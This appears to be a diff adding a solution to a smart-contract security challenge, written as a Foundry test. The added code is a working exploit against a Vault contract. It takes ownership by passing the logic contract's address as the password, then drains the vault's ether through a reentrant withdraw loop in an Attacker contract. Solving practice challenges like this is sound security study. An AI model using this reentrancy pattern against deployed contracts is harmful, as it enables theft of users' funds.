@@ -31,9 +31,39 @@ contract VaultExploiter is Test {
         vm.startPrank(palyer);
 
         // add your hacker code.
+        Attacker attack = new Attacker(payable(address(vault)));
+        bytes32 passWord = bytes32(uint256(uint160(address(logic))));
+        bytes memory data = abi.encodeWithSignature(
+            "changeOwner(bytes32,address)",
+            passWord,
+            address(attack)
+        );
+        (bool success,) = address(vault).call(data);
+        require(success, "call failed");
+        attack.attack{value:0.1 ether}();
 
         require(vault.isSolve(), "solved");
         vm.stopPrank();
     }
 
+}
+
+contract Attacker {
+    address payable public vault;
+
+    constructor(address payable _vault) {
+        vault =_vault;
+    }
+
+    function attack() public payable {
+        Vault(vault).openWithdraw();
+        Vault(vault).deposite{value: msg.value}();
+        Vault(vault).withdraw();
+    }
+    
+    receive() external payable {
+        if (vault.balance > 0) {
+            Vault(vault).withdraw();
+        }
+    }
 }
